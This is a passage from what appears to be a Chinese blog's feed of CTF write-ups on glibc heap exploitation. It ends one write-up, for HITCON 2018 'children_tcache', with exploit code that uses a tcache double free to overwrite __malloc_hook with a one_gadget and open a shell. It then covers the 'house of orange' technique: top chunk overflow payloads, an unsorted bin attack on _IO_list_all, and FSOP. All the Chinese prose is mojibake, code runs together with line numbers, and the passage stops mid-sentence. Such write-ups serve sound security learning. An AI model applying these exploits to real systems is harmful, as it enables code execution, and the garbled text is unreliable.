ä¸ºsizeè¢«æ”¹ï¼Œæ‰€ä»¥chunk_Cçš„prevsizeå¾—ä¸åˆ°ç»´æŠ¤#æ­¤å¤„å¦‚æžœä¸æ˜¯ä»Žlast_remainderä¸­åˆ†å‰²å°±ä¼šå‡ºé”™ï¼ï¼ï¼ï¼del_7_times(0, 7)add(0x60, 'aaaa') #0 chunk_b2 å°†chunk_Bå‰©ä¸‹éƒ¨åˆ†éƒ½å–å‡ºæ¥ï¼Œchunk_Cçš„prvesizeåŒæ ·æ²¡æœ‰è¢«ç»´æŠ¤dele(8) #é‡Šæ”¾b1dele(9) #overlap!!è§¦å‘ä»Žchunk_b1åˆ°topchunkçš„åˆå¹¶ï¼Œå…¶ä¸­åŒ…å«äº†æœªè¢«é‡Šæ”¾çš„chunk_b2 #topchunkä½äºŽchunk_b1çš„ä½ç½®ã€‚add_7_times(0x80) #1-6 8add(0x80, 'xxxx') #9ï¼Œé‡æ–°åˆ†é…chunk_b1ï¼ŒçŽ°åœ¨topchunkå’Œchunk_b2é‡åˆdel_7_times(1, 7) #å›žå¡«tcache 0x90dele(8) #å›žå¡«tcache 0x90ï¼Œå‰©0(chunk_b2) 7(chunk_A) 9(chunk_b1)add(0x500, '1111') #1ï¼Œè¯¥chunkå’Œ0é‡åˆadd(0x120, '2222') #2ï¼Œé˜²æ­¢è¢«topchunkåˆå¹¶dele(1)show(0)#æ³„æ¼libclibc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3ebca0print "libc_base: %#x" % libc_basemalloc_hook = libc.symbols['__malloc_hook'] + libc_baseprint "malloc_hook: %#x" % malloc_hookone_gadget = libc_base + 0x10a38cprint "one_gadget: %#x" % one_gadgetadd(0x120, '1111') #1 ä»Ž0x500å¤§å°çš„chunkä¸­åˆ†å‰²å‡º0x120ã€‚0å’Œ1éƒ½æŒ‡å‘è¯¥chunkdele(0) #æ”¾å…¥tcachedele(1) #å†æ¬¡æ”¾å…¥tcacheï¼Œdouble freeadd(0x120, p64(malloc_hook)) #ä¿®æ”¹fdä¸ºmalloc_hookadd(0x120, 'aaaa') add(0x120, p64(one_gadget)) #ä¿®æ”¹malloc_hookä¸ºone_gadgetp.recvuntil('Your choice: ') #getshellp.sendline('1')p.recvuntil('Size:')p.sendline('123')p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šchildren_tcacheexpå‚è€ƒï¼šHITCON2018-WP-By Nu1L]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>overlapping</tag>
        <tag>off_by_one</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å †åˆ©ç”¨å­¦ä¹ ä¹‹house of orange]]></title>
    <url>%2Fpost%2Ff8f8701e.html</url>
    <content type="text"><![CDATA[ç»ˆäºŽå­¦åˆ°äº†house of orangeï¼Œçœ‹äº†æ— æ•°å¸ˆå‚…çš„åšå®¢ï¼Œç»ˆäºŽé©¬é©¬è™Žè™Žç†æ¸…äº†ä¸€ç‚¹æ€è·¯ï¼Œè¿˜æ˜¯å¾—å†™ç‚¹ç¬”è®°ä»¥å…å¿˜æŽ‰ã€‚æ¦‚è¿°house of orangeæ˜¯æ¥è‡ªHitcon CTF 2016ä¸­çš„ä¸€é“åŒåé¢˜ç›®ï¼Œå…¶ä¸­ä½¿ç”¨äº†ä¸€ç§å…¨æ–°çš„æ”»å‡»æ‰‹æ®µï¼ˆçŽ°åœ¨ä¹Ÿä¸æ–°äº†2333ï¼‰ï¼Œæ”»å‡»çš„ä¸»è¦æ€è·¯æ˜¯åˆ©ç”¨unsorted attackä¿®æ”¹_IO_list_allæŒ‡é’ˆï¼Œå¹¶ä¼ªé€ _IO_FILE_plusç»“æž„ä½“åŠå…¶vtableï¼ˆè™šè¡¨ï¼‰æ¥åŠ«æŒæŽ§åˆ¶æµã€‚ç›´æŽ¥ä¸Šé¢˜ç›®å¥½äº†ã€‚ã€‚ã€‚é¢˜ç›®æè¿°ç¨‹åºèœå•ï¼š123456789+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up +++++++++++++++++++++++++++++++++++++Your choice :ç¨‹åºä¿æŠ¤å…¨å¼€_(:Ð·ã‚âˆ )_:12345CANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : ENABLEDRELRO : FULLç¨‹åºåˆ†æžbuildå‡½æ•°ï¼šç”¨æˆ·è¾“å…¥houseçš„åå­—ã€orangeçš„é¢œè‰²å’Œä»·æ ¼ï¼Œå¹¶ä½¿ç”¨ä¸¤ä¸ªç»“æž„ä½“ä¿å­˜ã€‚ç»“æž„ä½“ï¼š123400000000 house struc ; (sizeof=0x10, mappedto_6)00000000 orange dq ?00000008 name dq ?00000010 house ends123400000000 orange struc ; (sizeof=0x8, mappedto_7)00000000 price dd ?00000004 color dd ?00000008 orange endsé™åˆ¶äº†åªèƒ½buildå››æ¬¡ï¼Œæ¯æ¬¡buildä¼šç”³è¯·3ä¸ªchunkï¼Œå…¶ä¸­åªæœ‰ç¬¬äºŒä¸ªchunk(house name)å¯ä»¥æŽ§åˆ¶å¤§å°ï¼Œä¸”æœ€å¤§ä¸º0x10001234567891011121314house = (house *)malloc(0x10uLL);printf("Length of name :");size = get_num();if ( size &gt; 0x1000 ) size = 4096;house-&gt;name = (__int64)malloc(size);if ( !house-&gt;name )&#123; puts("Malloc error !!!"); exit(1);&#125;printf("Name :");get_str((void *)house-&gt;name, size);orange = (orange *)calloc(1uLL, 8uLL);upgradeå‡½æ•°ï¼šä¿®æ”¹houseçš„nameã€orangeçš„é¢œè‰²å’Œä»·æ ¼ï¼Œåªèƒ½ä¿®æ”¹æœ€è¿‘buildçš„houseã€‚123456printf("Length of name :");v2 = get_num();if ( v2 &gt; 0x1000 ) v2 = 4096;printf("Name:");get_str((void *)qword_203068[1], v2);ä¿®æ”¹nameçš„åœ°æ–¹æ²¡æœ‰æ£€æŸ¥sizeçš„å¤§å°ï¼Œæ‰€ä»¥å­˜åœ¨å †æº¢å‡ºseeå‡½æ•°æ‰“å°houseçš„åå­—ã€orangeçš„ä»·æ ¼ç­‰ï¼ŒåŒæ ·åªèƒ½æ‰“å°æœ€è¿‘buildçš„houseã€‚æ¼æ´žåˆ†æžæ³„éœ²libcåŸºå€å’Œå †åœ°å€å‘çŽ°ç¨‹åºä¸­æ²¡æœ‰freeå‡½æ•°ï¼Œå¯¼è‡´å¸¸è§„çš„å †åˆ©ç”¨æ–¹æ³•éƒ½å¾ˆéš¾ä½¿ç”¨ï¼Œè¿™ä¾¿æ˜¯house of orangeçš„æ ¸å¿ƒä¹‹ä¸€â€”â€”åœ¨æ²¡æœ‰freeå‡½æ•°çš„æƒ…å†µä¸‹å¾—åˆ°ä¸€ä¸ªé‡Šæ”¾çš„å †å—ï¼ˆunsorted binï¼‰ï¼Œä»Žè€Œæ³„éœ²æ•°æ®ã€‚åŽŸç†è€ƒè™‘è¿™ä¹ˆä¸€ç§æƒ…å†µï¼Œå‡è®¾åœ¨mallocæ—¶ï¼Œç¨‹åºä¸­çš„binsé‡Œéƒ½æ²¡æœ‰åˆé€‚çš„chunkï¼ŒåŒæ—¶top chunkçš„å¤§å°å·²ç»ä¸å¤Ÿç”¨æ¥åˆ†é…è¿™å—å†…å­˜äº†ã€‚é‚£ä¹ˆæ­¤æ—¶ç¨‹åºå°†ä¼šè°ƒç”¨sysmallocæ¥å‘ç³»ç»Ÿç”³è¯·æ›´å¤šçš„ç©ºé—´ï¼Œè€Œæˆ‘ä»¬çš„ç›®çš„åˆ™æ˜¯åœ¨sysmallocä¸­çš„_int_free()ï¼Œä»¥æ­¤æ¥èŽ·å¾—ä¸€å—é‡Šæ”¾çš„å †å—ã€‚1234567else&#123; void *p = sysmalloc (nb, av); //è°ƒç”¨sysmallocæ¥åˆ†é…å†…å­˜ if (p != NULL) alloc_perturb (p, bytes); return p;&#125;å¯¹äºŽå †æ¥è¯´æœ‰ä¸¤ç§æ‹“å±•æ–¹å¼ï¼Œä¸€æ˜¯é€šè¿‡æ”¹å˜brkæ¥æ‹“å±•å †ï¼ŒäºŒæ˜¯é€šè¿‡mmapçš„æ–¹å¼ã€‚å…¶ä¸­åªæœ‰brkæ‹“å±•çš„æ–¹å¼æ‰ä¼šè°ƒç”¨åˆ°_int_free()å°†è€çš„top chunké‡Šæ”¾æŽ‰ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ã€‚123456789// å¦‚æžœæ‰€éœ€åˆ†é…çš„chunkå¤§å°å¤§äºŽmmapåˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤ä¸º128Kï¼Œ// å¹¶ä¸”å½“å‰è¿›ç¨‹ä½¿ç”¨mmap()åˆ†é…çš„å†…å­˜å—å°äºŽè®¾å®šçš„æœ€å¤§å€¼// åˆ™å°†ä½¿ç”¨mmap()if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //ä½¿ç”¨mmap() &#125;ç”±ä¸Šè¯‰ä»£ç å¯çŸ¥ï¼Œè¦æƒ³ä½¿ç”¨brkæ‹“å±•ï¼Œéœ€è¦æ»¡è¶³chunk size &lt; 0xâ€­20000â€¬åŒæ—¶ï¼Œåœ¨ä½¿ç”¨brkæ‹“å±•ä¹‹å‰ï¼Œè¿˜ä¼šè¿›è¡Œä¸€ç³»åˆ—checkã€‚12345678// å¦‚æžœtop chunkæ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆ™sizeä¸º0// top chunkçš„å¤§å°éœ€è¦ &gt;= MINSIZE(æœ‰å¸ˆå‚…çš„åšå®¢è¯´åœ¨64ä½ä¸‹æ˜¯0x20)// top chunkçš„inuseä½éœ€è¦æ˜¯ 1// æ£€æŸ¥æ˜¯å¦å¯¹é½åˆ°å†…å­˜é¡µassert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0));è¿™é‡Œä¸»è¦å…³æ³¨å¦‚ä½•å¯¹é½åˆ°å†…å­˜é¡µã€‚çŽ°ä»£æ“ä½œç³»ç»Ÿéƒ½æ˜¯ä»¥å†…å­˜é¡µä¸ºå•ä½è¿›è¡Œå†…å­˜ç®¡ç†çš„ï¼Œä¸€èˆ¬å†…å­˜é¡µå¤§å°ä¸º4kb(0x1000)ï¼Œé‚£ä¹ˆtop chunkçš„sizeåŠ ä¸Štop chunkçš„åœ°å€æ‰€å¾—åˆ°çš„å€¼æ˜¯å’Œ0x1000å¯¹é½çš„ã€‚å¦‚ï¼š0x602020+0x20fe0=0x623000ã€‚æ•´ç†ä»¥ä¸Šä»£ç ï¼Œæ‰€éœ€çš„æ¡ä»¶æœ‰ï¼šåˆ†é…çš„chunkå¤§å°å°äºŽ0xâ€­20000ï¼Œå¤§äºŽtop chunkâ€¬çš„sizetop chunkå¤§å°å¤§äºŽ MINSIZEï¼ˆä¸èƒ½å¤ªå°å°±è¡Œï¼‰top chunkçš„inuseä¸º 1top chunkçš„å¤§å°è¦å¯¹é½åˆ°å†…å­˜é¡µæ»¡è¶³äº†ä»¥ä¸Šå„ç§æ¡ä»¶ä¹‹åŽï¼Œå°±å¯ä»¥æˆåŠŸçš„è°ƒç”¨_int_free()æ¥é‡Šæ”¾top chunk12345/* If possible, release the rest. */if (old_size &gt;= MINSIZE)&#123; _int_free (av, old_top, 1);//è°ƒç”¨_int_freeï¼Œfree old_topã€‚&#125;æ­¤åŽï¼ŒåŽŸå…ˆçš„top chunkå°†è¢«æ”¾å…¥unsorted binä¸­ã€‚ä¸‹ä¸€æ¬¡åˆ†é…æ—¶ï¼Œå°±å°†ä¼šä»Žunsorted binä¸­åˆ‡å‰²åˆé€‚çš„å¤§å°ï¼Œè€Œåˆ‡å‰²ä¸‹æ¥çš„chunkçš„fdå’Œbkçš„å€¼å°†ä¼šæ˜¯libcä¸­çš„åœ°å€äº†ï¼ŒåŒæ—¶ï¼Œè‹¥è¯¥chunkæ˜¯large chunkï¼Œåœ¨fd_nextsizeå’Œbk_nextsizezä¸­è¿˜ä¼šå‚¨å­˜å †ä¸­çš„åœ°å€ã€‚ç”±æ­¤ä¾¿å¯ä»¥å®Œæˆæ³„éœ²äº†ã€‚åˆ©ç”¨è¿‡ç¨‹å…ˆbuildä¸€ä¸ªhouseï¼Œé€šè¿‡upgradeä»Žnameæº¢å‡ºåˆ°top chunkï¼Œå°†top chunkçš„å¤§å°æ”¹ä¸º0xfa1ï¼ˆname chunkçš„å¤§å°ä¸º0x20ï¼‰123build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)12345678//å†…å­˜æƒ…å†µï¼š0x55e0ebd68000: 0x0000000000000000 0x0000000000000021 &lt;== house0x55e0ebd68010: 0x000055e0ebd68050 0x000055e0ebd680300x55e0ebd68020: 0x0000000000000000 0x0000000000000021 &lt;== name0x55e0ebd68030: 0x6161616161616161 0x61616161616161610x55e0ebd68040: 0x6161616161616161 0x0000000000000021 &lt;== orange0x55e0ebd68050: 0x0000001f00000008 0x00000000000000000x55e0ebd68060: 0x0000000000000000 0x0000000000000fa1 &lt;== top chunkç”³è¯·ä¸€ä¸ªå¤§äºŽtop chunkçš„ç©ºé—´ï¼Œè§¦å‘brkæ¥æ‹“å±•top chunkã€‚åŽŸtop chunkå°†ä¼šè¢«æ”¾å…¥unsorted bin1build(0x1000, 'aaaa')1234//å†…å­˜æƒ…å†µï¼š//å› ä¸ºæˆ‘ä¸æ˜¯åŒä¸€æ¬¡è¿è¡Œï¼Œåœ°å€å¯èƒ½å’Œå‰é¢ä¸åŒ¹é…unsortedbinall: 0x7f7ab34f37b8 (main_arena+88) â€”â–¸ 0x5598255700a0 â—‚â€” 0x7f7ab34f37b8å†ç”³è¯·ä¸€ä¸ªå¤§å°åˆé€‚çš„large chunkï¼Œè¯¥chunkå°†ä¼šä»Žunsorted binä¸­åˆ‡å‰²ä¸‹æ¥ã€‚1build(0x400, 'a'*0x8)123456//å†…å­˜æƒ…å†µï¼špwndbg&gt; x/32gx 0x559d1a1d40c00x559d1a1d40c0: 0x0000000000000000 0x00000000000004110x559d1a1d40d0: 0x6161616161616161 0x00007f732b8fddc8 &lt;== libc0x559d1a1d40e0: 0x0000559d1a1d40c0 0x0000559d1a1d40c0 &lt;== heap0x559d1a1d40f0: 0x0000000000000000 0x0000000000000000è°ƒç”¨see()ï¼Œè¾“å‡ºnameæ—¶ï¼Œå°†ä¼šæŠŠlibcçš„åœ°å€æ³„éœ²å‡ºæ¥ã€‚å†è°ƒç”¨upgrade()ï¼ŒæŠŠbkä¹Ÿå…¨éƒ¨å¡«å……ä¸ºâ€™aâ€™ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡see()å°±å¯ä»¥æ³„éœ²å‡ºheapçš„åœ°å€ã€‚åŠ«æŒæµç¨‹æŽ¥ä¸‹æ¥å°†ä¼šæ¶‰åŠåˆ°IO_FILEçš„åˆ©ç”¨ï¼Œè¿™ç§æ–¹æ³•è¢«ç§°ä¸ºFSOP(File Stream Oriented Programming)FILEä»‹ç»FILEåœ¨Linuxç³»ç»Ÿçš„æ ‡å‡†IOåº“ä¸­æ˜¯ç”¨äºŽæè¿°æ–‡ä»¶çš„ç»“æž„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚FILEç»“æž„åœ¨ç¨‹åºæ‰§è¡Œfopenç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºã€‚æ¯ä¸ªFILEç»“æž„éƒ½é€šè¿‡ä¸€ä¸ª _IO_FILE_plusç»“æž„ä½“æ¥å®šä¹‰ï¼Œç»“æž„ä½“å¦‚ä¸‹ï¼š12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;;å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª_IO_FILEç»“æž„ä½“å’Œä¸€ä¸ªvtable(è™šè¡¨)æŒ‡é’ˆã€‚_IO_FILEç»“æž„ä½“ä¿å­˜äº†FILEçš„å„ç§ä¿¡æ¯ã€‚vtable(è™šè¡¨)æŒ‡é’ˆæŒ‡å‘äº†ä¸€ç³»åˆ—å‡½æ•°æŒ‡é’ˆï¼Œç¨åŽå°±ä¼šç”¨åˆ°å…¶ä¸­çš„å‡½æ•°ã€‚_IO_FILEç»“æž„å®šä¹‰å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;æ•´ä¸ªç»“æž„ä¸ç”¨å®Œå…¨æŽŒæ¡ï¼Œå¤§æ¦‚äº†è§£å°±è¡Œã€‚åœ¨è¿›ç¨‹ä¸­çš„äº§ç”Ÿçš„å„ä¸ª_IO_FILEç»“æž„ä¼šé€šè¿‡å…¶ä¸­çš„struct _IO_FILE *_chain;è¿žæŽ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œå…¶ä¸­è¡¨å¤´ä½¿ç”¨å…¨å±€å˜é‡struct _IO_FILE_plus *_IO_list_allæ¥è¡¨ç¤ºï¼Œé€šè¿‡_IO_list_allå°±å¯ä»¥éåŽ†æ‰€æœ‰_IO_FILEç»“æž„ã€‚_IO_jump_t *vtableç»“æž„å®šä¹‰å¦‚ä¸‹:1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;;è¿™é‡Œé¢ä¿å­˜äº†ä¸€ç³»åˆ—çš„å‡½æ•°æŒ‡é’ˆã€‚ä»¥ä¸Šï¼Œä¸»è¦éœ€è¦äº†è§£çš„å°±æ˜¯ _IO_FILE_plusã€_IO_FILEã€vtable3ä¸ªç»“æž„ä»¥åŠ _IO_list_allæŒ‡é’ˆçš„å…³ç³»å’ŒåŠå…¶å†…å®¹ã€‚_IO_FILEå„ä¸ªæˆå‘˜çš„åç§»å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667_IO_FILE_plus = &#123; 'i386':&#123; 0x0:'_flags', 0x4:'_IO_read_ptr', 0x8:'_IO_read_end', 0xc:'_IO_read_base', 0x10:'_IO_write_base', 0x14:'_IO_write_ptr', 0x18:'_IO_write_end', 0x1c:'_IO_buf_base', 0x20:'_IO_buf_end', 0x24:'_IO_save_base', 0x28:'_IO_backup_base', 0x2c:'_IO_save_end', 0x30:'_markers', 0x34:'_chain', 0x38:'_fileno', 0x3c:'_flags2', 0x40:'_old_offset', 0x44:'_cur_column', 0x46:'_vtable_offset', 0x47:'_shortbuf', 0x48:'_lock', 0x4c:'_offset', 0x54:'_codecvt', 0x58:'_wide_data', 0x5c:'_freeres_list', 0x60:'_freeres_buf', 0x64:'__pad5', 0x68:'_mode', 0x6c:'_unused2', 0x94:'vtable' &#125;, 'amd64':&#123; 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' &#125;&#125;[æ³¨]åœ¨gdbä¸­æŸ¥çœ‹è¿™äº›ç»“æž„çš„æŒ‡ä»¤:123456//æŸ¥çœ‹_IO_list_allæŒ‡é’ˆp *_IO_list_all//æŸ¥çœ‹_IO_FILE_plusp (*(struct _IO_FILE_plus *) 0x55cdf66034f0)//æŸ¥çœ‹vtablep (*(struct _IO_jump_t *) 0x55cdf66034f0)unsortedbin attackæ ¹æ®house of orangeçš„æµç¨‹ï¼ŒæŽ¥ä¸‹æ¥å°†è¦æŽ§åˆ¶_IO_list_allæŒ‡é’ˆçš„å€¼ï¼Œå…·ä½“åŽŸå› åŽé¢ä¼šè®²åˆ°ã€‚è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨unsortedbin attackæ¥å¯¹å®ƒçš„å€¼è¿›è¡Œä¿®æ”¹ã€‚åŽŸç†åœ¨ä»Žunsorted binä¸­å–å‡ºchunkæ—¶ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š12345 bck = victim-&gt;bk; .../* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av);è¿™é‡Œå°†æœ€åŽä¸€ä¸ªchunkå–å‡ºï¼Œå¹¶æŠŠå€’æ•°ç¬¬äºŒä¸ªchunkçš„fdè®¾ç½®ä¸ºunsorted_chunks(av)ï¼Œè¿™é‡Œunsorted_chunks(av)å°±æ˜¯main_arenaä¸­topæˆå‘˜å˜é‡çš„åœ°å€(&amp;main_arena+88)ã€‚123456789101112131415//main_arenaçš„ç»“æž„struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; //æ­¤å¤„çš„åœ°å€å°†è¢«å†™å…¥ç›®æ ‡åœ°å€ mchunkptr last_remainder; ...&#125;å¯ä»¥å‘çŽ°ï¼Œå¦‚æžœæˆ‘ä»¬å°†victimçš„bkæ”¹å†™ä¸ºæŸä¸ªåœ°å€ï¼Œåˆ™å¯ä»¥å‘è¿™ä¸ªåœ°å€ + 0x10çš„åœ°æ–¹å†™å…¥&amp;main_arena+88ã€‚å› ä¸ºé¢˜ç›®ç¨‹åºä¸­å­˜åœ¨å †æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾æº¢å‡ºåˆ°æŸä¸ªchunkçš„bkï¼Œå¹¶å°†å®ƒæ”¹å†™ã€‚è¿™é‡Œæˆ‘ä»¬å†™å…¥_IO_list_all - 0x10ï¼Œè¿™æ ·å½“ä»Žunsorted binä¸­å–å‡ºå®ƒæ—¶ï¼Œå°±å¯ä»¥æˆåŠŸå°†_IO_list_allå†™ä¸º&amp;main_arena+88ã€‚å…·ä½“åˆ©ç”¨è¿‡ç¨‹éœ€è¦å’ŒåŽé¢FSOPé…åˆã€‚FSOPæ¼æ´žåŽŸç†å› ä¸º_IO_FILEç»“æž„ä½¿ç”¨é“¾è¡¨çš„ç»“æž„ç®¡ç†ï¼Œè¡¨å¤´ç”±_IO_list_allç»´æŠ¤ã€‚æ‰€ä»¥FSOPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ_IO_list_allçš„å€¼å¹¶ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„_IO_FILEåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹mallocå¯¹é”™è¯¯ä¿¡æ¯çš„å¤„ç†è¿‡ç¨‹.åœ¨mallocå‡ºé”™æ—¶ï¼Œä¼šè°ƒç”¨malloc_printerrå‡½æ•°æ¥è¾“å‡ºé”™è¯¯ä¿¡æ¯12if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);è€Œmalloc_printerråˆä¼šè°ƒç”¨__libc_message;__libc_messageåˆè°ƒç”¨abort;abortåˆ™åˆè°ƒç”¨äº†_IO_flush_all_lockpæœ€åŽ_IO_flush_all_lockpä¸­ä¼šè°ƒç”¨åˆ°vtableä¸­çš„_IO_OVERFLOWå‡½æ•°æ•´ä¸ªæµç¨‹å¦‚ä¸‹å›¾ï¼šæ‰€ä»¥å¦‚æžœå¯ä»¥æŽ§åˆ¶_IO_list_allçš„å€¼ï¼ŒåŒæ—¶å¤Ÿä¼ªé€ ä¸€ä¸ª_IO_FILEåŠå…¶vtableå¹¶æ”¾å…¥FILEé“¾è¡¨ä¸­ï¼Œå°±å¯ä»¥è®©ä¸Šè¿°æµç¨‹è¿›å…¥æˆ‘ä»¬ä¼ªé€ çš„vtable, å¹¶è°ƒç”¨è¢«ä¿®æ”¹ä¸ºsystemçš„_IO_OVERFLOWå‡½æ•°ã€‚ä½†æ˜¯æƒ³è¦æˆåŠŸè°ƒç”¨_IO_OVERFLOWå‡½æ•°è¿˜éœ€è¦ç»•è¿‡ä¸€äº›é˜»ç¢12345678910111213141516171819int _IO_flush_all_lockp (int do_lock)&#123; ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) ... ... fp = fp-&gt;_chain; &#125;&#125;è§‚å¯Ÿä»£ç å‘çŽ°ï¼Œ_IO_OVERFLOWå­˜åœ¨äºŽifä¹‹ä¸­ï¼Œæ ¹æ®çŸ­è·¯åŽŸç†ï¼Œè‹¥è¦æ‰§è¡Œåˆ°_IO_OVERFLOWï¼Œå°±éœ€è¦è®©å‰é¢çš„åˆ¤æ–­éƒ½èƒ½æ»¡è¶³ï¼Œå³ï¼š12fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_baseæˆ–è€…123_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_baseï¼‰ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶è‡³å°‘è¦æ»¡è¶³ä¸€ä¸ªï¼Œè¿™é‡Œæˆ‘ä»¬å°†é€‰æ‹©ç¬¬ä¸€ä¸ªï¼Œåªéœ€è¦æž„é€ modeã€_IO_write_ptrå’Œ_IO_write_baseã€‚å› ä¸ºè¿™äº›éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ çš„_IO_FILEä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æ¯”è¾ƒå®¹æ˜“å®žçŽ°ã€‚æ¼æ´žåˆ©ç”¨åœ¨å‰é¢å·²ç»ä»‹ç»è¿‡ï¼Œå¯ä»¥é€šè¿‡unsortedbin attackæ¥å°†_IO_list_allæŒ‡é’ˆçš„å€¼ä¿®æ”¹ä¸º&amp;main_arena+88ã€‚ä½†è¿™è¿˜ä¸å¤Ÿï¼Œå› 